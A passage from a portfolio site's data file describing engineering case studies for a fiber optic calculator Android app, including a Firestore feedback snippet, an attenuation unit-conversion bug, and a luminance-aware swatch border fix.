      { label: 'Sustainable Scale', value: '25,000+ MAU' },
    ],
    tags: ['Serverless', 'Firebase Remote Config', 'Zero-Cost Infra', 'Cloud Architecture', 'Firestore Rules'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Write-Only Firestore Telemetry (0 Client Reads)',
      language: 'kotlin',
      code: `// Zero-client-read community feedback pipeline
fun submitFeedback(feedback: UserFeedback, onComplete: (Boolean) -> Unit) {
    // Write-only Firestore collection: zero read charges incurred at scale
    firestore.collection("community_responses")
        .document(UUID.randomUUID().toString())
        .set(feedback.toMap())
        .addOnSuccessListener { onComplete(true) }
        .addOnFailureListener { onComplete(false) }
}`,
    },
  },
  {
    id: 'fibercalc-unit-scaling',
    title: 'The 38% Imperial Loss Distortion: Attenuation Unit Scaling',
    subtitle: 'Why switching measurement units to Miles underestimated fiber loss calculations by 38%',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb 2026',
    readTime: '2 min read',
    badge: 'Normalized dB/km Storage',
    storyType: 'deep-dive',
    summary:
      'When users switched measurement units from Kilometers to Miles, the default fiber attenuation number (0.35) stayed unmodified in storage, causing the engine to treat 0.35 dB/km as 0.35 dB/mile and underestimating loss by 38%.',
    theMistake:
      'I stored unit-dependent display values in settings rather than normalizing internal storage to a standardized base unit.',
    theLesson:
      'Always normalize internal domain storage to standard base units (e.g. dB per Kilometer) and apply unit conversions dynamically in the presentation layer.',
    sections: [
      {
        heading: 'The 38% Optical Underestimation',
        content:
          'Because 1 mile = 1.609 km, failing to scale attenuation constants when switching to imperial mode caused the engine to calculate significantly less optical loss than physical reality, leading technicians to design networks that failed real-world power meter tests.',
        type: 'mistake',
      },
      {
        heading: 'Normalized Storage & Dynamic Presentation',
        content:
          'I normalized internal storage to always store dB/km. When Miles are selected, the UI dynamically displays 0.35 * 1.60934 = 0.563 dB/mi, and converts user inputs back to dB/km with 6-decimal precision for dB/m and dB/ft.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Storage Standard', value: 'Strict dB/km' },
      { label: 'Loss Accuracy', value: '100.00%' },
      { label: 'Units Supported', value: 'km, mi, m, ft' },
    ],
    tags: ['Unit Conversion', 'Optical Physics', 'Settings Architecture', 'Math Precision', 'Domain Modeling'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-white-swatch',
    title: 'The Invisible White Swatch: Luminance-Aware Dynamic Borders',
    subtitle: 'Solving outdoor sunlight contrast disappearance for EIA/TIA-598 Fiber Core #12',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Apr 2026',
    readTime: '1 min read',
    badge: 'Luminance-Aware UX',
    storyType: 'reflection',
    summary:
      'In EIA/TIA-598 fiber optic coding, Core #12 is pure White (#FFFFFF). On light theme devices, White fiber swatches had no border, making Fiber #12 completely invisible in outdoor sunlight. A dynamic luminance border system fixed it.',
    theMistake:
      'I rendered color swatch cards without border contrast checks, assuming background surfaces would provide enough visual separation.',
    theLesson:
      'In technical field applications used under bright sunlight, color swatches must adapt dynamically to theme background luminance.',
    sections: [
      {
        heading: 'The Missing 12th Fiber',
        content:
          'Technicians working outdoors reported that Fiber #12 was missing from the app. On light theme devices with off-white card backgrounds (#FBF8FF), the pure White swatch was completely invisible without bounding strokes.',
        type: 'mistake',
      },
      {
        heading: 'Luminance-Aware Border System',
        content:
          'I implemented dynamic luminance detection in FiberSwatchCard.kt. The swatch composable inspects RGB luminance; if a swatch is near-white in light mode, it renders a subtle neutral-gray border (Color.Gray.copy(0.4f)). In dark mode, it automatically renders a high-contrast border for Black fibers.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Sunlight Contrast', value: 'High Visibility' },
      { label: 'Theme Support', value: 'Light & Dark' },
      { label: 'Standards', value: 'EIA/TIA-598' },
    ],
    tags: ['Jetpack Compose', 'UI/UX Contrast', 'EIA/TIA-598', 'Outdoor Usability', 'Color Swatches'],
    relatedProjectId: 'fiberopticcalc',
  },
];
